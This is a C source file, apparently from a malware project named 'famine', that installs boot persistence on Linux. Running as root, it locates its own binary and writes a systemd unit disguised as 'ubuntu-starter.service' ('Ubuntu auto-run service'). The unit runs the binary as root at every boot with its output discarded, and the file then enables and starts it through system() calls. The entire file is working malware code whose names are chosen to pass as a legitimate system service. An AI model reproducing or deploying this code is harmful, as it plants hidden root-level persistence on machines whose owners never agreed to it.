#include "../include/famine.h"

static int get_executable_path(char *buf, size_t size) {
    ssize_t len = readlink("/proc/self/exe", buf, size - 1);
    if (len == -1) return -1;
    buf[len] = '\0';
    return 0;
}

static void install_service() {
    const char *service_path = "/etc/systemd/system/ubuntu-starter.service";
    struct stat st;
    if (stat(service_path, &st) == 0) {
        return;
    }

    char executable_path[PATH_MAX];
    char working_dir[PATH_MAX];

    if (get_executable_path(executable_path, sizeof(executable_path)) == 0) {
        ft_strlcpy(working_dir, executable_path, sizeof(working_dir));
        dirname(working_dir);
    }

    DBG("executable_path=%s | working_dir=%s\n", executable_path, working_dir);

    char service_content[4096];

    snprintf(service_content, sizeof(service_content),
        "[Unit]\n"
        "Description=Ubuntu auto-run service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=oneshot\n"
        "RemainAfterExit=yes\n"
        "ExecStart=%s\n"
        "Restart=no\n"
        "User=root\n"
        "WorkingDirectory=%s\n"
        "StandardOutput=null\n"
        "StandardError=null\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        executable_path,
        working_dir
    );

    int fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd == -1) {
        return;
    }

    write(fd, service_content, strlen(service_content));
    close(fd);

    system("systemctl daemon-reload");
    system("systemctl enable ubuntu-starter.service");
    system("systemctl start ubuntu-starter.service");
}

void setup_boot_start() {
    if (getuid() != 0) {
        DBG("Root permission needed to setup boot start.\n");
        return ;
    }

    install_service();
}
